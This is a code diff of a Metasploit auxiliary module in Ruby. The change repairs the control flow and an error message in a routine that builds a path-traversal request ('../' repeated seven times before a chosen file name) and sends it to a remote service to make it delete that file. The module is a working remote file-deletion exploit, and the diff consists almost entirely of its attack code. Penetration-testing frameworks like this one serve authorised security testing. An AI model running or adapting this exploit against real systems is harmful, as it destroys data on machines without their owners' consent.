@@ -111,43 +111,42 @@ class MetasploitModule < Msf::Auxiliary
       vprint_status(Rex::Text.to_hex_dump(res))
     else
       print_error('No handshake response received.')
-      fail_with(Failure::Unreachable, "Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed: #{e.message}")
+      fail_with(Failure::Unreachable, "Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed.")
+    end
 
-      begin
-        fname = datastore['FILE']
-        traversal = '../' * 7
-        full_fname = traversal + fname
-        full_fname = full_fname.gsub(%r{/+}, '/')
+    begin
+      fname = datastore['FILE']
+      traversal = '../' * 7
+      full_fname = traversal + fname
+      full_fname = full_fname.gsub(%r{/+}, '/')
 
-        data = [0xaa].pack('N')
-        data << "unk_str1\x00"
-        data << [1].pack('N')
-        data << full_fname.encode('ASCII') + "\x00"
+      data = [0xaa].pack('N')
+      data << "unk_str1\x00"
+      data << [1].pack('N')
+      data << full_fname.encode('ASCII') + "\x00"
 
-        req = mk_msg(21, 0x0021, data)
-      rescue StandardError => e
-        fail_with(Failure::BadConfig, "Failed to construct request: #{e.class} - #{e.message}")
+      req = mk_msg(21, 0x0021, data)
+    rescue StandardError => e
+      fail_with(Failure::BadConfig, "Failed to construct request: #{e.class} - #{e.message}")
+    end
+
+    vprint_status(Rex::Text.to_hex_dump(req))
+
+    print_status("Deleting #{fname} from #{datastore['RHOSTS']}")
+    sock.put(req)
+
+    begin
+      res = sock.get
+      if res
+        print_good('Received response from target.')
+        vprint_status(Rex::Text.to_hex_dump(res)) if res
+      else
+        print_error('No response received from target.')
       end
-
-      vprint_status(Rex::Text.to_hex_dump(req))
-
-      print_status("Deleting #{fname} from #{datastore['RHOSTS']}")
-      sock.put(req)
-
-      begin
-        res = sock.get
-        if res
-
-          print_good('Received response from target.')
-          vprint_status(Rex::Text.to_hex_dump(res)) if res
-        else
-          print_error('No response received from target.')
-        end
-      rescue StandardError => e
-        fail_with(Failure::TimeoutExpired, "Failed to receive response: #{e.class} - #{e.message}")
-      ensure
-        disconnect
-      end
+    rescue StandardError => e
+      fail_with(Failure::TimeoutExpired, "Failed to receive response: #{e.class} - #{e.message}")
+    ensure
+      disconnect
     end
   end
 end
